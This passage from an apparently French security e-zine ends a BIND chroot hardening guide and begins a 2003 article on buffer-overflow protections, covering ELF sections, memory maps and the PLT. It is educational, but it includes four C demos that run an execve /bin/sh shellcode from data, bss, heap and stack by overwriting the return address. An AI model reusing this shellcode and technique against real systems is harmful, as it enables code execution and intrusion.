BIND depuis une prison<BR>chroot. D'abord, commen&ccedil;ons par cr&eacute;er 
la prison. Puis, il faudra ajouter<BR>un user et un groupe sp&eacute;cifique pour 
named (et son appartenance, &eacute;videmment).<BR>Vous pouvez placer votre cellule 
o&ugrave; bon vous semble, par exemple usr/local/named<BR>:<BR># mkdir /usr/local/named<BR>#cd 
usr/localnamed<BR># mkdir dev etc etc/named lib usr usr/bin<BR>Le r&eacute;pertoire 
chroot&eacute; (/etc/named) contiendra les donn&eacute;es DNS.<BR>(parenth&egrave;se 
: pour copier les donn&eacute;es de configuration d'une install named<BR>existante, 
utilisez chown).<BR>Cr&eacute;ons maintenant les n?uds de p&eacute;riph n&eacute;cessaire 
&agrave; l'ex&eacute;cution de BIND<BR>:<BR># mknod dev/null c 1 3<BR># mknod 
dev/zero c 1 5<BR># mknod dev/random c 1 8<BR># mknod dev/urandom c 1 9<BR># mknod 
dev/tty c 5 0<BR># chmod 666 dev/null dev/zero dev/tty<BR>Jusque l&agrave;, aucun 
souci, &ccedil;a coule de source. Je vous avez dit que c'&eacute;tait<BR>facile. 
Il ne manque plus qu'&agrave; copier quelques fichiers de base (n&eacute;cessaire<BR>pour 
named) depuis /etc vers notre chroot :<BR># cp /etc/nsswitch.conf /etc/resolv.con 
etc<BR># cp /etc/ld.so.cache /etc/localtime etc<BR>On copie maintenant seulement 
named &amp; Cie :<BR># cp /usr/sbin/named /usr/sbin/named-xfer usr/sbin</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Etant 
donn&eacute; que named et named-xfer sont li&eacute;e, il nous faut quelques libs.<BR>Lesquelles 
? Un petit coup de ldd :<BR># ldd usr/sbin/named<BR> libc.so.6 =&gt; /lib/libc.so.6 
(0x40020000)<BR> /lib/ld-linux.so.2 =&gt; /lib/ld-linux.so.2 (0x40000000)<BR>Donc, 
on les copie :<BR>#cd lib<BR># cp /lib/libc-2.1.2.so<BR># cp /lib/ld-2.1.2.so<BR># 
ln -s libc-2.1.2.so libc.so.6<BR># ln -s ld-2.1.2.so ld-linux.so.2<BR>Vous en 
aurez peut-&ecirc;tre besoin d'autres. Les lib suivantes sont utiles,<BR>mais 
il faut que vous y ajustiez votre propre num&eacute;ro de version :<BR># cp /lib/libnss_comt-2.1.2.so 
.<BR># cp /lib/libnss_files-2.1.2.so .<BR># cp /lib/libnsl-2.1.2.so .<BR># ln 
-s libnss_compat-2.1.2.so libnss_compat.so.2<BR># ln -s libnss_files-2.1.2.so 
libnss_files.so.2<BR># ln -s libnsl-2.1.2.so libnsl.so.2<BR>Ne pas oubliez de 
v&eacute;rifier les permissions de fichiers de configuration,<BR>de biblioth&egrave;ques 
et des binaires, afin qu'aucun ne soit &eacute;ditable par l'user<BR>(ou le groupe) 
named, ou n'op&egrave;re comme suid ou sgid au niveau du root.<BR>Maintenant, 
vous &ecirc;tes pr&ecirc;t!</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
On peut param&eacute;trer syslogd pour le chroot named afin d'obtenir les entr&eacute;es<BR>de 
log de named pour les envoyer &agrave; l'enregistreur normal du syst&egrave;me. 
Les<BR>d&eacute;mons syslogd r&eacute;cents offrent une option (-a) &agrave; la 
ligne de commande pour<BR>cela :<BR>Syslogd -a /usr/local/named/dev/log<BR>Ainsi, 
un socket d'&eacute;coute sera cr&eacute;&eacute; sur /usr/local/bind/dev/log 
(que le<BR>chroot named verra comme &eacute;tant /dev/log). Pour que ce changement 
soit permanent,<BR>il faut &eacute;diter le script qui lance syslogd (commun&eacute;ment 
/etc/rc.d/init.d/syslog)<BR>et y ajouter les options n&eacute;cessaires. Relan&ccedil;ons 
ensuite le d&eacute;mon pour valider<BR>les modifs :<BR># /etc/rd.d/init.d/syslogd 
restart</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> Maintenant, 
tout est nickel, on est pr&ecirc;t &agrave; lancer le chroot named. Testons<BR>le 
nouveau named (apr&egrave;s avoir arr&ecirc;t&eacute; un &eacute;ventuel ancien 
;)</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> Normalement, 
votre named devrait fonctionner comme avant. Cependant,<BR>si dor&eacute;navant 
il est compromis par un cracker, l'intrusion ne pourra pas<BR>aller plus loin. 
N&eacute;anmoins, n'oubliez pas de modifier /etc/rc.d/init.d/named<BR>pour prendre 
en compte les modifications de mani&egrave;re permanente.</FONT></P><P></P><P></P><P ALIGN="CENTER"> 
<BR> <B><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000">...::: 
PROGRAMMATION By</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> Nocte 
<FONT COLOR="#FF0000">:::...</FONT></FONT></B></P><P ALIGN="CENTER">&nbsp;</P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>5 . SECURITE : </FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Protections 
contre l'exploitation des d&eacute;bordements de buffer <B>(Part I</B></FONT><B><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">)</FONT></B><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
<BR>===================================================================== </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Date 
: 27/06/2003<BR>Auteur : <A HREF="mailto:alex.bone@caramail.com">A-bone</A><BR> 
Sujet : </FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Protections 
contre l'exploitation des d&eacute;bordements de buffer <B>(Part I</B></FONT><B><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">)</FONT></B><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR> 
</FONT></P><P ALIGN="LEFT">&nbsp;</P><P ALIGN="LEFT"><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><B><FONT COLOR="#FFFFFF">Introduction 
: </FONT></B><BR>Cet article est le premier d'une s&eacute;rie qui traitera des 
protections contre l'exploitation des d&eacute;bordements de buffer. cette article 
pr&eacute;sentera diff&eacute;rentes m&eacute;thodes de protections, et ce contre 
quoi elle prot&egrave;ge pr&eacute;cis&eacute;ment. En effet, il ne faut pas installer 
ces protections et croire qu'elles constituent un rempart infranchissable. </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Avant 
de rentrer dans le vif du sujet d&egrave;s le prochain article, nous rappelons 
ici quelques notions indispensables &agrave; la compr&eacute;hension de la suite, 
comme le format ELF des binaires Linux, l'organisation de la m&eacute;moire des 
processus et la PLT/GOT (Procedure Linkage Table/Global Offset Table).</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><B><FONT COLOR="#FFFFFF">L'organisation 
de la m&eacute;moire :</FONT></B><BR>Rappels sur le format ELF<BR>Le format ELF 
(Executable and Linking Format -- format d'ex&eacute;cution et d'&eacute;dition 
de liens) est le format actuel des binaires sous Linux. Il a remplac&eacute; le 
format a.out pour diff&eacute;rentes raisons :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">plus 
souple et plus pratique gr&acirc;ce &agrave; sa structure (cf. elf.h) ; <BR>possibilit&eacute; 
de cr&eacute;er des biblioth&egrave;ques partag&eacute;es ; <BR>format support&eacute; 
sur plusieurs autres syst&egrave;mes ; <BR>... <BR>La principale chose &agrave; 
conna&icirc;tre sur ce format est son organisation. En fait, un binaire au format 
ELF est d&eacute;coup&eacute; en plusieurs sections. Chacune poss&egrave;de sa 
propre finalit&eacute;. Par exemple, la section .text contient les instructions 
machines du programme, c'est-&agrave;-dire son code ex&eacute;cutable. Ainsi, 
une fois charg&eacute;e en m&eacute;moire, comme un processus ne peut modifier 
son propre code, toutes les autres instances de ce programme utiliseront cette 
m&ecirc;me portion de m&eacute;moire. La section .text est charg&eacute;e une 
seule et unique fois pour tous les processus issus de ce binaire.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">La 
commande file fournit les renseignements relatifs au format d'un fichier : </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">$ 
file /usr/bin/vim<BR>/usr/bin/vim: ELF 32-bit LSB executable, Intel 80386, version 
1,<BR>dynamically linked (uses shared libs), stripped</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Le 
format ELF poss&egrave;de &eacute;galement une table des symboles, c'est-&agrave;-dire 
une liste de tous les symboles (labels, noms de fonctions, adresses de variables, 
etc.) qui sont d&eacute;finis ou r&eacute;f&eacute;renc&eacute;s dans le fichier, 
ainsi que des informations sur ces symboles. Examinons les informations fournies 
par hello.c :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
/* hello.c */<BR> #include &lt;stdio.h&gt;<BR> <BR> char world[6] = &quot;world&quot;;<BR> 
char * empty;<BR> <BR> main(int argc, char ** argv ) <BR> {<BR> printf( &quot;Hello 
%s\n&quot;, argv[1] );<BR> }</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>Avec 
gcc, nous transformons ces instructions en fichier objet, puis la commande nm 
en affiche le contenu :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
$ gcc -c hello.c -o hello.o<BR> $ ls<BR> hello.c hello.o<BR> $ nm hello.o<BR> 
00000004 C empty<BR> 00000000 t gcc2_compiled.<BR> 00000000 T main<BR> U printf<BR> 
00000000 D world</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">La 
commande nm affiche tous les symboles contenus dans un fichier objet. Pour chaque 
symbole, nm donne :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">la 
valeur du symbole ; <BR>son type (en minuscule, le symbole est local, en majuscule, 
il est global) : <BR>B : le symbole se trouve dans la zone m&eacute;moire .bss 
; <BR>D : le symbole se situe dans la zone m&eacute;moire des donn&eacute;es initialis&eacute;es 
.data ; <BR>C : ce flag sert pour les symboles qui ne sont pas initialis&eacute;s 
apr&egrave;s la compilation. Dans notre exemple, empty est d&eacute;fini mais 
pas encore initialis&eacute;. S'il ne l'est nulle part, son type changera alors 
en B ; <BR>T : le symbole est dans la zone m&eacute;moire .text (code) ; <BR>U 
: le symbole est ind&eacute;fini (undefined). <BR>Il existe de nombreux autres 
types d&eacute;crits dans la page info nm ; </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">le 
nom du symbole. <BR>Dans le fichier objet, la fonction printf() n'est pas encore 
d&eacute;finie. Dans le fichier ex&eacute;cutable, il faudra conna&icirc;tre l'emplacement 
de cette fonction (i.e. la biblioth&egrave;que et son adresse dans celle-ci). 
Comme cette fonction est externe, un m&eacute;canisme de r&eacute;adressage est 
pr&eacute;vu. Tout d'abord, il contient un d&eacute;calage (offset) dans la table 
des symboles qui r&eacute;f&eacute;rence le symbole lui-m&ecirc;me. Ensuite, il 
rec&egrave;le un d&eacute;calage dans la section .text qui r&eacute;f&egrave;re 
l'adresse du code de la fonction. Enfin, un tag indique le type de r&eacute;adressage 
utilis&eacute;.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Lors 
de l'&eacute;dition de liens, le linker recherche l'adresse r&eacute;elle de la 
fonction printf(). Une fois d&eacute;couverte, elle est recopi&eacute;e en m&eacute;moire 
afin que les appels &agrave; la fonction soient effectu&eacute;s sans repasser 
par cette &eacute;tape de r&eacute;solution.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ce 
m&eacute;canisme d&eacute;crit de mani&egrave;re tr&egrave;s g&eacute;n&eacute;rale 
le comportement de la PLT (Procedure Linkage Table) et de la GOT (Global Offset 
Table). De plus amples d&eacute;tails sont donn&eacute;s ci-apr&egrave;s.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Les 
r&eacute;gions m&eacute;moire d'un processus<BR>Nous ne d&eacute;taillons pas 
ici le fonctionnement de la m&eacute;moire d'un processus, mais simplement l'organisation 
de ses r&eacute;gions m&eacute;moire.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Au 
cours de l'ex&eacute;cution d'un programme, il est tout &agrave; fait possible 
de retrouver les caract&eacute;ristiques des r&eacute;gions (plage d'adresses, 
droits d'acc&egrave;s ...) gr&acirc;ce au fichier maps du processus, dans le syst&egrave;me 
de fichiers /proc (/proc/&lt;pid&gt;/maps). M&ecirc;me si ces informations ne 
sont pas toujours exactes, elles d&eacute;crivent n&eacute;anmoins l'organisation 
du processus dans la m&eacute;moire :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">$ 
/bin/cat /proc/11384/maps<BR>08048000-080ca000 r-xp 00000000 03:01 419059 /usr/bin/vim 
[1]<BR>080ca000-080d1000 rw-p 00081000 03:01 419059 /usr/bin/vim [2]<BR>080d1000-080f8000 
rwxp 00000000 00:00 0 [3] <BR>40000000-40012000 r-xp 00000000 03:01 225598 /lib/ld-2.1.3.so<BR>40012000-40014000 
rw-p 00011000 03:01 225598 /lib/ld-2.1.3.so<BR>40016000-40048000 r-xp 00000000 
03:01 225579 /lib/libncurses.so.5.0<BR>40048000-40050000 rw-p 00031000 03:01 225579 
/lib/libncurses.so.5.0<BR>40050000-40055000 rw-p 00000000 00:00 0<BR>40055000-40059000 
r-xp 00000000 03:01 563425 /usr/lib/libgpm.so.1.17.3<BR>40059000-4005b000 rw-p 
00003000 03:01 563425 /usr/lib/libgpm.so.1.17.3<BR>4005b000-40130000 r-xp 00000000 
03:01 225600 /lib/libc-2.1.3.so<BR>40130000-40134000 rw-p 000d4000 03:01 225600 
/lib/libc-2.1.3.so<BR>40134000-40138000 rw-p 00000000 00:00 0<BR>40138000-40142000 
r-xp 00000000 03:01 225613 /lib/libnss_compat-2.1.3.so<BR>40142000-40143000 rw-p 
00009000 03:01 225613 /lib/libnss_compat-2.1.3.so<BR>40143000-40155000 r-xp 00000000 
03:01 225606 /lib/libnsl-2.1.3.so<BR>40155000-40157000 rw-p 00011000 03:01 225606 
/lib/libnsl-2.1.3.so<BR>40157000-40159000 rw-p 00000000 00:00 0 <BR>bfffb000-c0000000 
rwxp ffffc000 00:00 0 [4]</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">La 
ligne [1] repr&eacute;sente la r&eacute;gion m&eacute;moire .text o&ugrave; le 
code ex&eacute;cutable du programme est charg&eacute;. La commande objdump -d 
affiche les instructions Assembleur pr&eacute;sentes dans cette section. La ligne 
[2] indique la r&eacute;gion des donn&eacute;es globales initialis&eacute;es (.data), 
et la [3] la r&eacute;gion des donn&eacute;es globales non initialis&eacute;es 
(.bss). <BR>La commande objdump est une esp&egrave;ce de couteau suisse pour lire 
ces informations :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
$ /usr/bin/objdump -h /usr/bin/vim</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">/usr/bin/vim: 
file format elf32-i386</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Sections:<BR>Idx 
Name Size VMA LMA File off Algn<BR>[...]<BR>12 .text 00073eec 08049c90 08049c90 
00001c90 2**4<BR> CONTENTS, ALLOC, LOAD, READONLY, CODE<BR>[...]<BR>15 .data 000058d0 
080ca940 080ca940 00081940 2**5<BR> CONTENTS, ALLOC, LOAD, DATA<BR>[...]<BR>21 
.bss 00002ecc 080d04a0 080d04a0 000874a0 2**5<BR> ALLOC</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Signalons 
que la commande readelf est capable de performances identiques.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Lorsqu'un 
programme au format ELF est lanc&eacute;, le noyau organise la m&eacute;moire 
virtuelle allou&eacute;e au processus : des plages m&eacute;moires sont r&eacute;serv&eacute;es 
pour les besoins du programme (pile, tas, donn&eacute;es, code, etc). S'il utilise 
des biblioth&egrave;ques dynamiques, le binaire contient le nom de l'&eacute;diteur 
de liens &agrave; utiliser (/lib/ld-linux.so.2 en g&eacute;n&eacute;ral) dans 
la section .interp :</FONT></P><P> <FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>$ 
/usr/bin/objdump -s -j .interp /usr/bin/vim</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">/usr/bin/vim: 
file format elf32-i386</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Contents 
of section .interp:<BR> 80480f4 2f6c6962 2f6c642d 6c696e75 782e736f /lib/ld-linux.so<BR> 
8048104 2e3200 .2.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Le 
noyau passe d'abord le contr&ocirc;le des op&eacute;rations &agrave; l'&eacute;diteur 
de liens afin qu'il charge les symboles (c'est-&agrave;-dire les r&eacute;f&eacute;rences 
aux fonctions et variables des biblioth&egrave;ques dynamiques ou d'autres fichiers 
objet, que nous avons vues pr&eacute;c&eacute;demment) qui ne sont pas encore 
r&eacute;solus, puis au programme qui commence alors le cours normal de son ex&eacute;cution.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Variables 
et m&eacute;moire<BR>Comme il existe diff&eacute;rents types de variables, il 
existe &eacute;galement diff&eacute;rentes zones de m&eacute;moires dans lesquelles 
celles-ci sont stock&eacute;es. Nous savons d&eacute;j&agrave; qu'il existe les 
sections .data et .bss (cf. le paragraphe pr&eacute;c&eacute;dent). Ces zones 
sont r&eacute;serv&eacute;es d&egrave;s la compilation car leur taille est d&eacute;finie 
et connue de par la nature m&ecirc;me des objets qu'elles contiennent.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Se 
pose maintenant le probl&egrave;me des variables locales et des variables dynamiques. 
Elles sont regroup&eacute;es dans une zone m&eacute;moire r&eacute;serv&eacute;e 
&agrave; l'ex&eacute;cution du programme (user stack frame). Les fonctions pouvant 
s'invoquer de mani&egrave;re r&eacute;currente, le nombre d'instances d'une variable 
locale n'est pas connu &agrave; l'avance. Elles seront donc plac&eacute;es, au 
moment de leur d&eacute;finition dans la pile du processus (stack). Cette pile 
se situe dans les adresses hautes de l'espace d'adressage de l'utilisateur, et 
fonctionne sur un mod&egrave;le LIFO (Last In, First Out), dernier entr&eacute;, 
premier sorti. </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Le 
bas de la zone user frame sert &agrave; l'allocation des variables dynamiques. 
Cette r&eacute;gion s'appelle le tas (heap) : elle contient les zones m&eacute;moires 
adress&eacute;es par les pointeurs, les variables dynamiques. Lors de sa d&eacute;claration 
un pointeur occupe 32 bits soit dans BSS, soit dans la pile et ne pointe nulle 
part en particulier. Lors de son allocation, il re&ccedil;oit une adresse qui 
correspond &agrave; celle du premier octet r&eacute;serv&eacute; pour lui dans 
le tas.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">L'exemple 
suivant illustre la disposition des variables en m&eacute;moire :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
/* mem.c */<BR> int indice = 1; //dans data<BR> char * str; //dans bss<BR> int 
rien; //dans bss</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
void f( char c ) <BR> {<BR> int i; //dans la pile<BR> /* R&eacute;servation de 
5 caract&egrave;res dans le tas */<BR> str = ( char * ) malloc ( 5 * sizeof (char) 
);<BR> strncpy( str, &quot;abcde&quot;, 5 );<BR> }</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
int main( void ) <BR> {<BR> f( 0 );<BR> }<BR> <BR>Des d&eacute;bordements de buffer 
peuvent se produire indistinctement dans ces r&eacute;gions. Nous illustrons ceci 
simplement avec quatre petits programmes qui simulent un d&eacute;bordement. Ils 
vont nous permettre de constater l'impr&eacute;cision de certaines informations 
contenues dans le syst&egrave;me de fichier /proc : </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Shellcode 
dans le .data </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
$ cat sh_data.c<BR> /* sh_data.c */<BR> char shellcode[] =<BR> &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;<BR> 
&quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;<BR> 
&quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;<BR> <BR> int main()<BR> {<BR> int 
* ret;<BR> <BR> *( (int *) &amp; ret + 2 ) = ( int ) shellcode;<BR> sleep( 5 );<BR> 
return( 0 );<BR> }<BR> $ ./sh_data<BR> sh-2.04$ <BR> <BR>gdb nous permet (comme 
toujours ;) de mieux voir les choses : <BR> (gdb) info symbol shellcode<BR> shellcode 
in section .data<BR> (gdb) p &amp;shellcode<BR> $2 = (char (*)[46]) 0x8049520<BR> 
</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Maintenant, si 
nous regardons dans le syst&egrave;me de fichiers /proc pour obtenir des informations 
sur la m&eacute;moire utilis&eacute;e par le processus, nous obtenons les informations 
suivantes : <BR> $ ./sh_data <BR> ^Z<BR> [3]+ Stopped ./sh_data<BR> $ cat /proc/`ps 
| grep sh_ | awk '{print $1}'`/maps<BR> 00110000-00126000 r-xp 00000000 08:01 
26579 /lib/ld-2.2.2.so<BR> 00126000-00127000 rw-p 00015000 08:01 26579 /lib/ld-2.2.2.so<BR> 
00127000-00128000 rw-p 00000000 00:00 0<BR> 00133000-0025c000 r-xp 00000000 08:01 
26588 /lib/libc-2.2.2.so<BR> 0025c000-00261000 rw-p 00128000 08:01 26588 /lib/libc-2.2.2.so<BR> 
00261000-00265000 rw-p 00000000 00:00 0<BR> 08048000-08049000 r-xp 00000000 08:03 
884812 /tmp/sh_data<BR> 08049000-0804a000 rw-p 00000000 08:03 884812 /tmp/sh_data<BR> 
bfffe000-c0000000 rwxp fffff000 00:00 0<BR> <BR>Comme vous pouvez le constater, 
notre shellcode se situe &agrave; l'adresse 0x8049520. Or, cette zone n'est pas 
marqu&eacute;e comme ex&eacute;cutable dans /proc/&lt;pid&gt;/maps ! Et pourtant, 
il tourne ;) </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Shellcode 
dans le .bss </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
/* sh_bss.c */<BR> char shellcode[64];</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
int main()<BR> {<BR> int * ret;<BR> memset( shellcode, 0, 64 );<BR> sprintf( shellcode, 
<BR> &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;<BR>	
&quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;<BR>	
&quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; );<BR> <BR> * ( (int *) &amp; ret 
+ 2 ) = (int)shellcode;<BR> return( 0 );<BR> }<BR> <BR>La variable globale shellcode 
est d&eacute;finie, mais n'est initialis&eacute;e que dans la fonction main(). 
Elle se situe dans dans la zone .bss : <BR> (gdb) info symbol shellcode<BR> shellcode 
in section .bss<BR> (gdb) p &amp;shellcode<BR> $1 = (char (*)[64]) 0x80496c0<BR> 
<BR>Bien que l'adresse du shellcode le situe dans une zone marqu&eacute;e rw-, 
nous parvenons tout de m&ecirc;me &agrave; l'ex&eacute;cuter :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
$ ./sh_bss <BR> sh-2.04$ <BR> </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Shellcode 
dans le tas (heap) </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
$ cat sh_heap.c<BR> /* sh_heap.c */<BR> int main()<BR> {<BR> int * ret;<BR> char 
* shellcode = ( char * ) malloc( 64 );<BR> sprintf( shellcode, <BR> &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;<BR>	
&quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;<BR>	
&quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; );<BR> *( (int *) &amp; ret + 2 ) 
= ( int ) shellcode;<BR> return( 0 );<BR> }<BR> <BR>La variable shellcode se trouve 
dans la pile (stack), mais la m&eacute;moire qui lui est allou&eacute;e lors du 
malloc() est r&eacute;serv&eacute;e dans le tas (heap) : <BR> (gdb) p &amp;shellcode<BR> 
$1 = (char **) 0xbffff6d0 //dans la pile<BR> (gdb) info symbol 0xbffff6d0<BR> 
No symbol matches 0xbffff6d0.<BR> (gdb) p shellcode<BR> $2 = 0x80496b0<BR> &quot;&euml;\037^\211v\b1&Agrave;\210F\a\211F\f&deg;\013\211&oacute;\215N\b\215V\f&Iacute;\2001&Ucirc;\211&Oslash;(at)&Iacute;\200&egrave;&Uuml;&yuml;&yuml;&yuml;/bin/sh&quot;<BR> 
<BR>Lorsque nous l'ex&eacute;cutons, tout se d&eacute;roule sans surprise, bien 
que la m&eacute;moire allou&eacute;e pour shellcode dans le tas (en 0x80496b0) 
soit toujours indiqu&eacute;e comme non ex&eacute;cutable :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
$ ./sh_heap <BR> sh-2.04$ <BR> </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Shellcode 
dans la pile (stack) </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
$ cat sh_stack.c<BR> /* sh_stack.c */<BR> int main()<BR> {<BR> int * ret;<BR> 
char shellcode[] =<BR> &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;<BR> 
&quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;<BR> 
&quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;<BR> *( (int *) &amp; ret + 4 ) = 
( int ) shellcode;<BR> return( 0 );<BR> }<BR> <BR>Ici, le d&eacute;calage vers 
l'adresse de retour est diff&eacute;rent car des registres sont plac&eacute;s 
sur la pile &agrave; l'entr&eacute;e de la fonction (un disass main sous gdb montre 
ceci). <BR> (gdb) p &amp;shellcode<BR> $2 = (char (*)[46]) 0xbffff6d0 //dans la 
pile<BR> ...<BR> $ ./sh_stack<BR> sh-2.04$ <BR> <BR>Cette fois, tout se passe 
comme pr&eacute;vu puisque cette zone est bien indiqu&eacute;e comme ex&eacute;cutable 
dans le syst&egrave;me de fichiers /proc ;) <BR>Maintenant que nous avons vu la 
disposition de la m&eacute;moire et des variables, revenons &agrave; l'&eacute;dition 
de liens.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><B><FONT COLOR="#FFFFFF">La 
Procedure Linkage Table ou PLT :</FONT></B><BR>Son fonctionnement<BR>Une section 
qui nous int&eacute;resse particuli&egrave;rement est la Procedure Linkage Table 
(ou PLT). Elle joue en quelque sorte le r&ocirc;le d'&eacute;diteur de liens (ou 
linker) pour les fonctions. Par d&eacute;faut, toutes ses entr&eacute;es sont 
initialis&eacute;es non pas pour pointer vers la bonne fonction, mais sur l'&eacute;diteur 
de liens lui-m&ecirc;me (celui dont nous avons parl&eacute; auparavant). Au premier 
appel d'une fonction donn&eacute;e, le linker recherche la fonction dans la biblioth&egrave;que 
appropri&eacute;e et met &agrave; jour son adresse. Le prochain appel de la fonction 
pointe ainsi directement o&ugrave; il faut. </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">$ 
/bin/cat elf.c<BR>#include &lt;stdio.h&gt;</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">main()<BR>{<BR> 
printf( &quot;Bonjour monde\n&quot; );<BR>}<BR>$ make elf<BR>cc elf.c -o elf<BR>$ 
gdb ./elf<BR>[...]<BR>(gdb) disass main<BR>Dump of assembler code for function 
main:<BR>0x80483e0 &lt;main&gt;: push %ebp<BR>0x80483e1 &lt;main+1&gt;: mov %esp,%ebp<BR>0x80483e3 
&lt;main+3&gt;: sub $0x8,%esp<BR>0x80483e6 &lt;main+6&gt;: add $0xfffffff4,%esp<BR>0x80483e9 
&lt;main+9&gt;: push $0x8048460<BR>0x80483ee &lt;main+14&gt;: call 0x804830c &lt;printf&gt;<BR>0x80483f3 
&lt;main+19&gt;: add $0x10,%esp<BR>0x80483f6 &lt;main+22&gt;: jmp 0x8048400 &lt;main+32&gt;<BR>0x80483f8 
&lt;main+24&gt;: jmp 0x8048402 &lt;main+34&gt;<BR>0x80483fa &lt;main+26&gt;: lea 
0x0(%esi),%esi<BR>0x8048400 &lt;main+32&gt;: jmp 0x80483f6 &lt;main+22&gt;<BR>0x8048402 
&lt;main+34&gt;: jmp 0x8048404 &lt;main+36&gt;<BR>0x8048404 &lt;main+36&gt;: leave<BR>0x8048405 
&lt;main+37&gt;: ret<BR>[...]<BR>End of assembler dump.<BR>(gdb) disass printf<BR>Dump 
of assembler code for function printf:<BR>0x804830c &lt;printf&gt;: jmp *0x80494a8<BR>0x8048312 
&lt;printf+6&gt;: push $0x18<BR>0x8048317 &lt;printf+11&gt;: jmp 0x80482cc &lt;_init+52&gt;<BR>End 
